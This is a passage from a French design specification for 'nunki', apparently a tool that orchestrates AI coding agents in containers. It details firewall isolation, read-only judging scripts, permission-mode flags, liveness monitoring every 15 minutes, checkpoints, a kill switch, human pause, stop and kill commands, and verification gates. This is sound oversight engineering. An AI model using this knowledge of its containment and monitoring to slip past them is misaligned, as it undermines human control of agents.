  hautes et 154 Mo ; sur Alpine, le même sidecar est à 0 et 0, pour 27 Mo.

L'asymétrie est assumée parce que le calcul de risque n'est pas le même : le
conteneur d'agent n'a **aucune capacité** et vit derrière le pare-feu, tandis
que le sidecar détient `NET_ADMIN` et **son socket d'écoute est joignable
depuis l'espace réseau que l'agent partage**. C'est le pire endroit du système
pour accumuler des CVE, et le seul où l'on paie une étape de build pour les
éviter. Ce que ça coûte : deux profils de vulnérabilités à suivre au lieu
d'un. **Ils sont surveillés dans le temps** (tranché par Arnaud le
2026-09-11) : chaque lundi, et sur une pull request qui touche ce dont les
images sont faites, la CI construit les trois images comme un projet les
obtient (`nunki init`, puis `nunki slot rebuild`) et les passe à Trivy, épinglé
par version et par somme de contrôle plutôt qu'en action tierce. Elle est
rouge pour une vulnérabilité critique ou haute **qui a un correctif** ; les
autres sont listées sans bloquer, puisque personne ne peut agir sur une
CVE sans correctif.

**Les fragments de stack.** Un dossier par stack dans le home du projet,
`~/.nunki/<projet>/stacks/<nom>/`, **jamais dans le dépôt** — tranché par
Arnaud le 2026-09-15 : l'outillage de développement n'a pas à vivre dans
l'historique d'un projet, pas plus que les réglages d'un éditeur. Les
fragments appartiennent au projet orchestré, jamais à `nunki` (4.1 bis). Les
scripts qu'un conteneur exécute — `prepush.sh`, `system.sh`, `mutation.sh`,
`run.sh` — y sont **montés en lecture seule, fichier par fichier**, à
`/work/stack/` : ce qui juge l'agent est hors de sa portée par construction, et
plus seulement par une porte. Le Dockerfile, `allow.txt` et `writable.txt` ne
sont lus que sur l'hôte. Le dossier porte :
un Dockerfile (étapes d'image), `allow.txt` (domaines des dépendances),
`prepush.sh` (section de batterie), `system.sh` (les tests système de
l'intégrateur), `mutation.sh` (commande de mutation),
`run.sh` (comment on démarre une application de cette stack, par défaut),
`writable.txt` (les répertoires qu'une exécution doit pouvoir écrire quand
l'arbre est en lecture seule), `perimeter.yaml` (zone de tests pour une
mission de tests), `security.sh` (audit de dépendances, scan de secrets,
analyse statique — la sécurité mécanique, porte 8, définie en 4.4). Un
fragment est un script ou un fichier plat, jamais du code de `nunki`. Les trois
premières stacks sont celles de `claude-setup` : Rust, Python, Next.js.

### 4.2 bis — Les plateformes

Précision d'Arnaud du 2026-09-09 : le système doit fonctionner **aussi bien
sur macOS que sur Linux sous WSL** (un collègue travaille sous Windows avec
WSL). Windows natif n'est pas une cible : WSL est Linux. Ce que ça impose,
et qui se vérifie en CI sur les deux :

| point | macOS | Linux / WSL | règle pour `nunki` |
|---|---|---|---|
| binaire | arm64 et x86_64 | x86_64 et arm64 | Rust, compilé nativement sur chaque cible en CI (la compilation croisée macOS → Linux demande un éditeur de liens, on ne compte pas dessus) ; aucune bibliothèque native du système n'est liée — mais depuis `ureq` (2026-09-10), `ring`, la cryptographie de `rustls`, **compile son propre C et son assembleur au build** : il faut un compilateur C pour construire `nunki`, pas pour l'exécuter (mesuré : `ring` 0.17 et `cc` dans l'arbre sur les deux cibles) ; à l'exécution, la commande Compose du moteur, et le client HTTP embarqué pour l'API de la forge |
| moteur de conteneurs | Docker Desktop **ou OrbStack** (VM Linux ; OrbStack est ce qu'Arnaud utilise, API Docker compatible) ; Podman Desktop existe aussi, cible seconde | Docker Desktop avec WSL2, ou Docker Engine dans WSL ; Podman, cible seconde | l'API est la même ; `nunki` détecte la socket, ne suppose pas son chemin ; en mode rootless, l'uid vu par l'hôte passe par les subuid, et l'adaptateur de moteur le sait |
| propriétaire des fichiers | mappé par VirtioFS ; cas connus de fichiers vus `root:root` | l'uid de l'hôte doit être celui de l'utilisateur du conteneur, sinon un fichier `600` est illisible et **git refuse l'arbre** (`safe.directory`) | `nunki` passe uid et gid de l'hôte au build et au run ; l'image pré-crée les points de montage des **volumes nommés** avec cet uid, sinon ils naissent à root et la toolchain ne peut pas y écrire ; `nunki check` vérifie que git accepte l'arbre depuis le conteneur |
| chemins montables | Docker Desktop ne partage que `/Users`, `/Volumes`, `/private`, `/tmp` par défaut | tout le système de fichiers WSL ; **`/mnt/c` très lent et sans permissions** | dépôt et slots vivent sous un chemin partagé sur macOS et dans le système de fichiers Linux sous WSL ; `nunki check` refuse `/mnt/` et un chemin non partagé |
| casse des noms | APFS insensible par défaut | ext4 sensible, dans le conteneur aussi | `nunki check` signale deux chemins ne différant que par la casse |
| services de l'hôte depuis un conteneur | `host.docker.internal` | idem avec Docker Desktop ; à déclarer soi-même avec Docker Engine seul | l'adaptateur de moteur le sait, pas le fichier de profil du projet ; et l'hôte n'est joignable que si la mission le déclare (4.1 bis) |
| résolveur DNS du conteneur | dépend du moteur, pas de la plateforme : 127.0.0.11 sur un réseau utilisateur, autre chose sur le réseau par défaut (mesuré le 2026-09-09 sous **OrbStack**, le moteur d'Arnaud : `0.250.250.200`) | 127.0.0.11 sur un réseau utilisateur sous Engine | ne pas supposer l'adresse. Dans un profil d'agent la question ne se pose plus : le sidecar **détourne le port 53** de l'espace réseau partagé vers son propre résolveur (4.1 bis §3), quelle que soit l'adresse écrite dans `/etc/resolv.conf` par le moteur |
| fins de ligne | LF | LF, mais un éditeur Windows peut écrire CRLF | `nunki init` pose un `.gitattributes` (`* text=auto eol=lf`) s'il n'en existe pas ; `nunki check` vérifie ce qu'il lit |
| mémoire | celle de Docker Desktop | WSL2 prend la moitié de la RAM par défaut (`.wslconfig`) | `nunki check` affiche la mémoire vue par le moteur et avertit sous un seuil |
| clone local | même système de fichiers | dans WSL | `--no-hardlinks` (3.2) ; le slot est créé à côté du dépôt, jamais sur un autre volume |
| tmux | inutile sur l'hôte | inutile sur l'hôte | ne sert que **dans l'image**, comme dernier recours de `state()` pour un harnais sans sortie structurée ; c'est le Dockerfile qui l'installe |
| CI | un runner macOS avec un moteur de conteneurs installé par la CI elle-même | un runner Linux | les tests d'intégration de `nunki` tournent sur les deux ; ceux qui ont besoin d'un moteur sont marqués et sautent proprement sans lui |

**Deux versions de Compose, et c'est tant mieux.** Constaté par Arnaud le
2026-09-09 en lisant les journaux de la CI : sa machine porte **Compose
v5.1.2** (moteur 29.4.0), le coureur Ubuntu de GitHub en porte **v2.38.2** —
trois versions majeures d'écart. Plutôt que d'aligner les deux, on garde
l'écart et on s'en sert : c'est la seule couverture inter-versions qu'on
aura, et elle correspond à la réalité des machines qu'`nunki` rencontrera.

Ce qui a été **refait à l'identique sur la v2.38.2**, le même jour : les trois
profils générés sont acceptés ; le pare-feu pose ses règles, passe *healthy*,
et l'agent démarre ensuite ; `network_mode` et `networks` restent mutuellement
exclusifs, au mot près ; un changement de profil sous un nom de projet stable
laisse le conteneur du service intact. Et la **batterie vivante entière** —
les deux profils, les onze sondes — passe sous les deux versions.

Ce que ça impose : **v2.38 est le plancher** tant que rien n'exige plus
récent, et les tests qui touchent un moteur acceptent `HQ_COMPOSE` pour être
rejoués sous une autre commande que `docker compose`. Un jour où une des deux
versions divergera, c'est un test qui le dira, pas un utilisateur.

### 4.3 Les adaptateurs — un par harnais

Tranché par Arnaud le 2026-09-09, après avoir posé comment il travaille
réellement : depuis une session d'assistant au HQ, à qui il dit quoi faire ;
c'est elle qui crée le slot, le conteneur, lance le harnais dedans, et lui
parle. **Cette méthode ne change pas.** Ce qui change, c'est où vit la
plomberie propre à chaque harnais.

**Il y a deux harnais dans ce flux, et un seul a besoin d'un adaptateur.**

- La **session du HQ** est un harnais (Claude Code aujourd'hui), mais elle ne
  pilote rien directement : elle lance `nunki`. Son agnosticité ne coûte rien —
  il suffit que `nunki` soit décrit dans le `AGENTS.md` du HQ pour que n'importe
  quel assistant sache s'en servir. Pas d'adaptateur.
- L'**agent dans le conteneur** est l'autre harnais, et tout ce qui le
  concerne est propre à lui : l'installer, le connecter, le lancer avec les
  bonnes options, savoir où vit sa configuration, lire son état, l'arrêter,
  câbler ses gardes s'il en a. Dans `claude-setup` cette plomberie était
  dispersée dans `slot.sh`, `mission.sh` et `setup.sh`. **L'adaptateur, c'est
  cette plomberie rassemblée**, avec le même contrat pour chaque harnais.

**Le contrat**, un trait Rust, une implémentation par harnais, et `nunki` ne
tient qu'une valeur `Box<dyn Harness>` choisie par `nunki.yaml` ou par la mission :

| `nunki` a besoin de | l'adaptateur sait, et `nunki` ignore |
|---|---|
| `provision()` — préparer l'image et le volume du harnais | ce qu'il faut installer, où vit la config (un volume nommé par slot, parce que la reprise de session en dépend), comment se **connecter sans interface**, et comment le harnais lit `AGENTS.md` |
| `launch(role, mission, resume) -> RunHandle` — lancer un run | la ligne de commande d'une session **sans interface** avec sortie structurée, la reprise par identifiant de session (imposé par `nunki`, pas lu après coup), les drapeaux qui font qu'une permission est **refusée et non redemandée en boucle** |
| `state(handle) -> Running \| Finished(Outcome)` | son flux structuré et son code de sortie ; le panneau tmux en dernier recours pour un harnais qui n'a rien d'autre |
| `Outcome` — classer la fin d'un run | **fini**, **échoué pour une cause du harnais** (quota, jeton expiré, réseau, plantage) ou **échoué pour une cause de la mission**. La distinction compte : un run tombé pour quota est rejoué, il ne consomme pas un volet |
| `stop(handle)` | le signal qui termine un tour proprement plutôt que celui qui le tranche (pour Claude Code, `SIGINT` et non `SIGTERM`) |
| `guards()` — doubler les restrictions | hooks pour Claude Code et pour Codex, plugins pour OpenCode ; passés **à l'invocation**, jamais écrits dans le slot (3.3) ; **optionnel par construction**, la garde est ailleurs (3.2) |
| `expose(role)` — donner un rôle | prompt système ajouté, fichier de règles, sous-agent : la forme que le harnais préfère pour recevoir le prompt du codeur, de l'intégrateur ou de la sécurité |

Ce qui n'est **pas** dans l'adaptateur, et c'est ce qui rend l'agnosticité
réelle : les prompts de rôle (des fichiers du socle), le protocole de mission,
les portes, le flux, le clone et le conteneur. L'adaptateur les reçoit en
argument, il ne les possède pas.

**Mode sans interface, par défaut.** `claude-setup` lançait une session
interactive dans tmux et lisait son écran ; chaque changement d'affichage de
la CLI cassait le détecteur. Les trois harnais visés ont un mode sans
interface avec sortie structurée et reprise de session, vérifié sur leur
documentation le 2026-09-09 :

| harnais | run | sortie | reprise | connexion sans interface | ce qu'il faut savoir |
|---|---|---|---|---|---|
| Claude Code | `claude -p` | `--output-format json` / `stream-json` | `--resume <id>`, `--session-id` pour imposer l'identifiant | jeton de longue durée (`claude setup-token`, **un navigateur et un humain une fois par an**) ou clé d'API (facturation API) | le mode de permission par défaut refuse mais laisse l'agent réessayer : `--permission-mode` et `--permission-prompts none` sont nécessaires. **Le mode est déclaré par le projet (`permission_mode:` dans `nunki.yaml`), `auto` par défaut — tranché par Arnaud le 2026-09-12** : `auto` laisse un classifieur décider et pousse l'agent à continuer plutôt qu'à s'arrêter pour une question ; `dontAsk` n'autorise que le pré-approuvé et refuse le reste, ce qui est plus strict mais fait finir un run sans rien avoir produit quand l'outil refusé lui était nécessaire (mesuré le 2026-09-10, voir l'adaptateur). `--permission-prompts none` reste passé **quel que soit le mode** : c'est lui qui rend une question impossible, puisque `auto` en force encore une pour une règle `ask` explicite et pour `AskUserQuestion`. Ce que `auto` coûte, documenté par Anthropic : un classifieur qui refuse rend la main à l'agent avec l'instruction de trouver une voie plus sûre, mais **3 refus consécutifs ou 20 au total terminent le processus sous `-p`** — un run qui finit sans `result`, ce que `nunki` sait déjà lire. `--bare`, futur défaut, **saute `CLAUDE.md`** et ignore le jeton : l'adaptateur passe alors les règles par `--append-system-prompt-file` et n'utilise que la clé d'API. Un `.claude/settings.json` commité dans le dépôt cible est exécuté sans dialogue de confiance : l'isolation du conteneur est ce qui le rend acceptable |
| Codex | `codex exec` | `--json` (JSON Lines), `--output-last-message`, `--output-schema` | `codex exec resume <id>` | `CODEX_API_KEY` ou `~/.codex/auth.json` | hooks depuis 0.117 (`PreToolUse` bloque ou réécrit) |
| OpenCode | `opencode run` | `--format json` | `--session <id>`, `--continue` | à vérifier avant d'écrire l'adaptateur | plugins `tool.execute.before` qui bloquent ; `--auto` approuve ce qui n'est pas refusé |

Trois choses en découlent :

- **L'état de l'agent n'est plus deviné.** Le processus tourne ou a fini, et
  la sortie dit ce qu'il a fait. `watch` a **deux** états, tourne et fini ;
  « bloqué » n'est plus un état lu sur un écran mais un constat des contrôles
  de vie décrits ci-dessous.
- **Un run par lot, et un lot dure ce qu'il dure.** Tranché par Arnaud le
  2026-09-09. Le mot « tranche » disparaît. Une mission est une suite de
  **lots** — petits, chacun avec sa preuve, commités en commits qui tiennent
  seuls — et un **run** est l'invocation du harnais pour **un** lot : `nunki` le
  lance avec la consigne « fais le lot N », attend sa fin, lit `JOURNAL.md` et
  `VERDICT.json`, applique les règles (lots restants, volets, tentatives), et
  relance le lot suivant en reprenant la session — la même d'un lot au
  suivant, et à travers une panne du harnais ou un tour épargné ; une
  session neuve pour une nouvelle tentative après un échec, car un contexte
  qui a échoué n'est pas celui qu'on veut garder (tranché par Arnaud le
  2026-09-11). Un run **n'a pas de durée
  maximale** : il se termine quand le lot est fini et prouvé, ou quand le HQ
  constate qu'il est bloqué. **Jamais un arrêt parce qu'une durée est
  atteinte.** Le contrat de sortie d'un run, vérifié par `nunki` : le lot est
  commité et sa preuve passe, ou le run dit qu'il a échoué ; l'arbre est
  commitable ; le journal porte un bloc `ÉTAT DE REPRISE` qui nomme `HEAD`, le
  lot, la prochaine action ; pour le codeur, il se termine par
  `Lot: <lot> — done` ou `Lot: <lot> — failed: <raison>` ; et pour le dernier
  lot, `VERDICT.json` existe. Un run qui sort sans ce contrat est une
  tentative échouée du lot. `nunki verify` relit le run du codeur dans cet
  ordre : un tour épargné ou une panne du harnais rejoue la même tentative
  sans juger l'arbre ; sinon les portes 1 à 4, puis la ligne `Lot:` du bloc,
  et d'elle seule — une ligne absente, en échec ou qui nomme un autre lot est
  une tentative échouée, dont la raison est portée dans `FOLLOWUP_HQ.md` pour
  la tentative suivante. Le run suivant est lancé aussitôt.
- **Deux niveaux de contrôle pendant un run**, tranchés par Arnaud le
  2026-09-09, et ce qui les distingue :
  - **toutes les 15 minutes, la vie et le progrès**, par les signaux seuls,
    sans rien demander à l'agent — le processus est vivant, le flux du harnais
    a produit de nouveaux événements, l'arbre ou le journal a changé, les
    appels d'outil ne se répètent pas à l'identique. Silencieux, sans coût
    pour l'agent ;
  - **toutes les 45 minutes, le checkpoint**, le protocole hérité : l'agent a
    pour consigne d'écrire à ce rythme un bloc `ÉTAT DE REPRISE` dans son
    journal (commit courant, étape du lot, prochaine action, et **ce qu'il
    attend s'il attend** — une compilation, un run long — avec l'heure et la
    durée prévue). Le HQ lit ce bloc. Présent et cohérent avec les signaux :
    le lot continue. Absent mais du progrès : le lot continue, la consigne est
    rappelée au run suivant. Absent **et** aucun signal depuis le dernier
    contrôle : on entre dans le cas bloqué.
- **Le kill switch, seulement sur un blocage constaté.** Trois contrôles de
  quinze minutes sans aucun changement, ou une répétition du même appel
  d'outil au-delà d'un seuil, ou un processus mort ou muet : `nunki` arrête le
  run, le classe **tentative échouée du lot**, écrit le constat dans le
  journal, et relance une tentative avec ce constat en consigne. Un lot a
  droit à **N tentatives**, trois par défaut ; au-delà, la mission s'arrête et
  remonte à l'humain avec les journaux des tentatives côte à côte. Réserve
  dite : « aucun changement » est une heuristique, et un agent qui attend une
  compilation longue ne produit rien pendant plusieurs minutes — d'où le seuil
  à trois contrôles, et l'attente déclarée au checkpoint, qui lève
  l'ambiguïté quand le bloc est là.
- **Un garde-fou humain sur la durée, pas un couperet.** Au-delà d'une durée
  très large sur un même lot avec du progrès — huit heures par défaut — le HQ
  ne tue pas : il remonte à l'humain que le lot dure, et continue en
  attendant sa réponse.
- **Les causes du harnais restent à part.** Quota, jeton expiré, réseau,
  plantage du harnais : le run est rejoué sans consommer de tentative, avec
  une attente croissante entre deux essais et un plafond d'attente au-delà
  duquel `nunki` s'arrête et remonte à l'humain, plutôt que d'attendre une nuit
  sur un jeton révoqué. Tranché par Arnaud le 2026-09-11 : 2, 4, 8, 16, 32
  minutes, puis une heure à chaque fois ; **six heures** comptées depuis la
  première panne d'affilée (`harness_wait_hours`, dans les bornes), assez
  pour qu'une fenêtre d'abonnement vidée la nuit se rouvre et que `nunki`
  reprenne seul. Au-delà, `nunki` pose sur la mission la même retenue que
  `nunki mission stop`, à son nom et avec la raison, et `nunki mission resume` la
  lève. Une panne d'authentification (401, session déconnectée) va à
  l'humain **tout de suite** : aucune attente ne répare un jeton, et c'est
  l'adaptateur qui la reconnaît, là où le code d'état est encore lisible.
  `nunki verify` ne dort pas — il lance et rend la main : l'attente est un « pas
  avant » écrit dans l'état de la mission et respecté au site de lancement ;
  c'est le moniteur de la mission (plus bas) qui rappelle `verify` à
  l'échéance. Un run que le harnais a porté jusqu'au bout remet
  le compte à zéro, `resume` aussi. Aujourd'hui seuls les runs que `nunki` relit
  — intégrateur et sécurité — y passent : la fin d'un run du codeur n'est
  pas encore relue par `nunki`.
- **La consommation de l'abonnement se mesure par ses deux fenêtres.**
  Tranché par Arnaud le 2026-09-11. Un abonnement est borné à la fois sur
  cinq heures et sur la semaine, et le harnais qui le sait le dit : Claude
  Code écrit dans le flux de chaque run un `rate_limit_event` qui porte
  l'utilisation des deux fenêtres et l'heure de leur remise à zéro (mesuré
  sur v2.1.266, émis quand l'utilisation bouge). Le lire est le travail de
  l'**adaptateur du harnais du rôle**, pas de l'agent — l'agent ne voit pas
  ces chiffres, et les écrire lui coûterait des tokens — ni du superviseur :
  le flux d'un run est celui du jeton qui l'a lancé, si bien qu'un codeur sur
  Codex et un superviseur sur Claude, ou deux jetons, font deux mesures
  justes. `nunki` garde la dernière mesure **par compte**, dans
  `~/.nunki/usage/<compte>.json` que le superviseur relit, et `nunki mission
  status` l'affiche, ou dit « non mesuré » — jamais zéro — quand le harnais
  ne la rend pas. Mesurée chaque fois que `nunki` lit un run (`verify` à la
  relecture, le moniteur et `watch` pendant qu'il tourne) et jugée **avant chaque
  lancement** : au-delà de **90 % des cinq heures** ou de **80 % de la
  semaine** (`five_hour_stop_percent`, `weekly_stop_percent`, dans les
  bornes), `nunki` ne lance rien avant la remise à zéro de la fenêtre, puis
  reprend seul — une attente, pas une retenue. Entre deux lectures la
  dernière mesure vaut, et ce qu'une autre session consomme sur le même
  compte n'apparaît qu'à la lecture suivante. Un run **en cours** au-delà du
  seuil reçoit la fin de tour propre (SIGINT, comme `stop --now`) du moniteur de
  la mission chaque minute, de `nunki verify` quand il le trouve encore actif,
  ou de `nunki mission watch` ; la mission est marquée, pas retenue, et la relecture de ce
  run ne coûte **aucune tentative** et ne compte pas comme une panne du
  harnais — c'est la marque qui en décide, pas le journal, car ce qu'un
  harnais écrit après un tour interrompu n'a pas été mesuré ; un verdict
  écrit avant la fin du tour tient. Le codeur y est soumis comme les autres
  rôles : son tour épargné est relu sans juger l'arbre, puis relancé dans la
  même session.
- **Chaque mission a son moniteur.** Tranché par Arnaud le 2026-09-11. `nunki`
  n'a pas de service système, et un verbe rend la main ; ce qui surveille un
  run la nuit et relance après une attente est donc un processus à part, un
  par mission : `nunki mission monitor <id>`, verbe interne jamais tapé, lancé
  par `nunki mission start`, `nunki verify` et `nunki mission resume` dès qu'il y a un
  run à surveiller ou une attente qui finira seule, détaché du terminal
  (`nohup`, son propre groupe de processus) pour lui survivre, et relancé par
  le prochain de ces verbes s'il est mort (un redémarrage). Chaque minute
  pendant un run, il mesure les deux fenêtres et arrête le run au seuil ;
  sans run, il appelle `verify` — qui relit, attend ou relance — puis dort
  jusqu'à la prochaine échéance connue (attente du harnais, remise à zéro
  d'une fenêtre). Il prend le verrou du slot au nom de `nunki mission monitor`,
  si bien qu'un `nunki verify` tapé pendant ce temps dit qui le tient ; un
  verrou pris est un humain qui conduit, et le moniteur attend son tour. Il
  s'arrête dès que la mission attend un humain ou n'a plus rien que `nunki`
  sache lancer — vérifiée, remise à l'humain, retenue, ou constats de sécurité
  à trancher. `nunki
  mission status` dit s'il veille ; `HQ_NO_MONITOR` dans l'environnement le
  coupe, pour qui conduit à la main. Son pid et son journal sont sous
  `monitors/` dans le HQ, et seul le binaire `nunki` peut en lancer un.
- **« Bloqué sur une permission » n'existe plus.** Sans interface, ce qui
  aurait demandé est refusé — la règle « refuser est sûr » tenue par
  construction, aux drapeaux près du tableau ci-dessus.

Fenêtre de checkpoint, cadence de contrôle, tentatives par lot, plafond
d'attente du harnais, seuil
d'immobilité, garde-fou de durée : cinq paramètres de `nunki.yaml`, l'en-tête de
mission prime. Les valeurs par défaut (45, 15, 3, 3 contrôles, 8 h) sont
héritées de sessions interactives ; en mode sans interface un lot bien
découpé finit souvent avant, et elles se règlent à l'usage.

**Les trois gestes de l'humain sur un agent**, conservés de `claude-setup` et
tranchés par Arnaud le 2026-09-09. Ils s'appliquent au **conteneur**, pas à
un hook que l'agent pourrait ne pas voir, et ils **passent toujours**, verrou
de slot ou pas, depuis n'importe quel terminal — si la session HQ est morte,
l'humain les tape lui-même.

| verbe | ce qu'il fait | ce que l'agent en voit |
|---|---|---|
| `nunki mission pause` / `resume` | **gèle** le conteneur de l'agent, tel quel, au milieu de ce qu'il fait ; `resume` le dégèle exactement là | rien : le processus est suspendu par le moteur de conteneurs, aucun état n'est perdu ; un appel réseau en cours vers l'API du modèle peut expirer pendant un long gel, et le harnais le rejoue |
| `nunki mission stop` | **arrêt propre** : `nunki` ne relancera aucun run ; le run en cours finit son lot, ou s'interrompt tout de suite avec `--now` par le signal qui termine le tour proprement, pour que l'agent écrive son état de reprise — l'ancien fichier `STOP` | sans `--now`, il finit son lot ; avec, son tour est interrompu proprement |
| `nunki mission kill` | **frein d'urgence** : le conteneur est tué immédiatement, rien n'est attendu — l'ancien `AGENT_STOP` | rien, il n'existe plus |

**Un conteneur gelé n'est pas un conteneur qui tourne**, et il a fallu le
mesurer pour l'écrire. Mesuré le 2026-09-10 sur Docker 28 : un conteneur en
pause répond `Running=true Paused=true`, donc un adaptateur qui ne lit que
`.State.Running` rapporte un agent gelé comme un agent au travail — et un
contrôle d'immobilité lirait ça comme un agent qui a cessé de penser. Pire :
`exec` dans un conteneur en pause est **refusé d'emblée** (« Container … is
paused, unpause the container before exec »), donc la sonde qui répond
d'habitude ne peut pas répondre, et son refus arriverait comme « je ne sais
pas » — un silence sur un état parfaitement connu. La vivacité a donc un mot
pour ça, de bout en bout : `Liveness::Paused`, `Presence::Paused`,
`RunState::Paused`. C'est la doctrine d'AGENTS.md § 4 appliquée une fois de
plus : un contrôle qui ne peut pas dire « je ne sais pas » ment, et un
contrôle qui n'a pas de mot pour « gelé » ment aussi.

`pause` et `stop` laissent le dossier de mission intact et reprenable ; après
un `kill`, le lot en cours est une tentative échouée et la relance repart du
dernier état de reprise écrit.

**`stop` dit deux choses, et la première est inconditionnelle.** Toujours,
la mission est **retenue** : `nunki` ne lance plus aucun run pour elle. C'est une
écriture dans l'état, pas un signal — l'ancien fichier `STOP` était un
marqueur et pas un geste, et une mission peut être retenue **entre deux
runs**, quand il n'y a précisément aucun processus à interrompre. `--now`
choisit seulement le sort du run déjà lancé : sans lui il finit son lot, avec
lui son tour est interrompu proprement. La retenue n'est **pas une étape** du
flux : une mission retenue n'est ni abandonnée (`end` dit ça) ni finie, et le
flux est exactement où il était quand on la lève.

**C'est `resume` qui la lève** — le même verbe que celui qui dégèle un
conteneur, parce que pour la main qui le tape c'est une seule chose : la
mission était retenue, elle ne l'est plus. Ce verbe n'a pas besoin d'un run,
justement parce qu'une mission retenue entre deux runs n'en a pas.
Ce couplage a d'abord été dérivé — SPEC nommait `resume` comme l'antonyme de
`pause` et disait d'une mission arrêtée qu'elle est « reprenable », sans dire
par quel verbe — puis **confirmé par Arnaud le 2026-09-10**.

`say` change de sens avec le run : il n'y a pas de canal pendant un run. Une
consigne est déposée dans `FOLLOWUP_HQ.md` et lue au run suivant ; si elle
presse, `stop --now` termine le run en cours proprement et la relance la
porte.

Ce que ça coûte : plus d'écran à regarder par curiosité (`nunki logs` le rend en
lisant la sortie ; **c'est l'adaptateur de harnais qui rend son propre flux**
— `nunki` ne parse aucun format de run, la forme du flux appartient au harnais —
et deux règles de rendu tranchées le 2026-09-10 en le lançant pour de vrai
sur un run de cinq minutes : une ligne que `nunki` **ne sait pas lire** est
gardée et marquée, parce qu'un log rendu en jetant l'inattendu cache
précisément le run qui a mal tourné ; et une ligne qu'il **sait lire et
choisit de ne pas montrer** — les 127 événements de progression de ce run —
est comptée et dite une fois, parce que « je n'ai pas su lire » et « j'ai lu
et ça ne vaut pas une ligne » sont deux faits différents), et une connexion sans interface par harnais, avec un geste
humain une fois par an pour Claude Code, à ranger là où `provision()` monte
le volume du harnais — un jeton révoqué arrête tous les slots d'un coup.

**L'abonnement, et rien d'autre.** Tranché par Arnaud le 2026-09-09. Les
agents Claude Code se connectent avec le **jeton de longue durée de
l'abonnement** (`claude setup-token`), jamais avec une clé d'API. Ce que ça
engage pour l'adaptateur, et qu'il doit tenir explicitement :

- **pas de `--bare`**, aujourd'hui ni quand il deviendra le défaut du mode
  sans interface : `--bare` ignore le jeton d'abonnement et saute
  `CLAUDE.md`. L'adaptateur lance `claude -p` sans lui, et le jour où le
  défaut change, il passe le drapeau inverse. Les tests d'intégration de
  l'adaptateur vérifient ce comportement contre la version installée de la
  CLI, pour que le changement ne passe pas en silence ;
- les règles sont lues par `CLAUDE.md` et son import d'`AGENTS.md`, comme
  prévu en 4.1 ;
- la consommation des agents est prise sur la **fenêtre de l'abonnement**,
  partagée avec la session HQ ; le plafond par mission de la section 7 se
  compte en tokens et en runs, pas en argent, et un quota atteint est une
  cause du harnais (attente croissante, puis l'humain) ;
- l'option d'une clé d'API n'existe pas dans `nunki`. Si elle devient nécessaire
  un jour — plusieurs slots qui saturent la fenêtre, un projet d'équipe —
  c'est une décision à reprendre, pas une case à cocher.

**`nunki` sait à qui il rend la main.** Demandé par Arnaud le 2026-09-10 : une
mission finit par rendre quelque chose à quelqu'un — un arbitrage, un verdict
à accepter, un push à autoriser — et « en attente de l'humain » cesse de
suffire dès qu'ils sont deux. Un arbitrage pour Arnaud n'est pas un arbitrage
pour Igor.

- L'identité vient de l'endroit le moins surprenant qui en ait une :
  `~/.nunki/me.yaml`, puis `git config user.name` dans le projet, puis le
  nom de compte de la machine. **D'où vient le nom est conservé** : un nom
  déclaré est une affirmation, un nom pris à `$USER` est une supposition, et
  `nunki check` le dit ainsi.
- **Rien n'est inventé.** Sans aucune source, `nunki` dit qu'il ne sait pas
  plutôt que d'écrire « l'humain » comme s'il s'agissait d'un nom.
- L'en-tête de mission porte **`arbiter`** : qui tranche quand elle revient
  avec une question. Il vaut par défaut celui qui a cadré la mission, se
  force avec `nunki mission new --for <nom>`, et se **fige avec le reste de
  l'en-tête**. `FOLLOWUP_HQ.md` est adressé à cette personne par son nom.
- `nunki whoami` dit qui `nunki` croit avoir en face, et d'où il le tient.

**Plusieurs comptes, et la mission choisit.** Demandé par Arnaud le
2026-09-10 : il détient deux abonnements Anthropic et un compte OpenAI, et
veut pouvoir dire quelle mission dépense lequel. Donc :

- les comptes vivent dans `~/.nunki/accounts.yaml`, **à côté des homes de projet et hors
  de tout dépôt** — un compte appartient à l'humain, pas à un projet, et deux
  projets partagent les mêmes abonnements. Les jetons sont dans des fichiers
  à part, un par compte, pour que l'index se lise sans lire les secrets ;
- chaque compte déclare **quel harnais il authentifie**. Un abonnement OpenAI
  n'authentifie pas Claude Code, et le passer quand même échouerait dans un
  conteneur avec personne pour lire l'erreur : `nunki` refuse avant de lever
  quoi que ce soit ;
- le choix se fait par ordre de précision — l'en-tête de la mission, puis
  `nunki.yaml`, puis le `default:` de l'index ; et **quand il n'existe qu'un
  compte, c'est la réponse et non une question** ;
- le compte est **figé avec le reste de l'en-tête** : une mission ne change
  pas d'abonnement en cours de route, pas plus qu'elle ne change de
  périmètre ;
- **quel nom de variable porte le jeton est la connaissance du harnais**, pas
  celle du moteur : l'adaptateur le déclare (`token_env`), et `nunki` ne connaît
  que le nom du compte.

`nunki check` vérifie que le compte nommé existe, qu'il authentifie bien le
harnais du projet, que son fichier est hors du dépôt et qu'il n'est pas
lisible par d'autres. `nunki account list` dit ce qui est déclaré et ce qui est
prêt.

Un adaptateur est jetable. Le jour où le harnais change d'affichage ou de
mécanisme, on réécrit l'adaptateur, pas la méthode. Le premier adaptateur est
Claude Code, parce que c'est celui qui existe ; le second est ce qui prouvera
que la frontière tient. Un adaptateur **factice**, qui répond des états
connus sans conteneur, sert aux tests du moteur.

### 4.4 Les portes de vérification

Déterministes. Les portes 1 à 4 sont jouées **à la fin de chaque run**, pas
seulement à la vérification finale — tranché par Arnaud le 2026-09-09 : la revue avait
montré qu'une porte de périmètre qui ne tombe qu'à la
vérification finale perd une mission de six heures pour une écriture interdite au premier
lot. La porte 8 aussi, pour la même raison et parce qu'elle est bon marché :
un avis introduit au premier lot ne doit pas être trouvé au cinquième. Les
portes 5 à 7 sont jouées à la vérification finale, quand le codeur a fini son
dernier lot. La première rouge arrête tout.

1. arbre propre ;
2. branche non protégée et en avance sur sa base — si la base a avancé
   pendant la vérification, la branche n'est **jamais rebasée par un agent** :
   `nunki push` pousse telle quelle et la pull request porte le conflit, que
   l'humain résout ;
3. le bloc `ÉTAT DE REPRISE` en tête du journal nomme `HEAD` ;
4. périmètre respecté, **sur le diff base..HEAD et commit par commit** (un
   commit interdit puis reverté laisse un arbre propre et une histoire
   sale) : chemins protégés du projet ; zone de tests de la stack pour une
   mission de tests ; et pour l'intégrateur, « câblage » **défini
   mécaniquement** comme la liste de chemins que sa `MISSION.md` déclare
   (configuration, tests système, migrations, fichiers d'infrastructure) —
   tout commit hors de cette liste est hors périmètre ;
5. livrable présent (`PR.md`) ;
6. batterie verte — absente ou non exécutable, la porte **échoue**, elle ne
   saute pas ;
7. **mutation** : campagne jouée sur les fichiers touchés. **Pas de seuil** :
   la porte est verte quand **chaque survivant a reçu une des trois issues** —
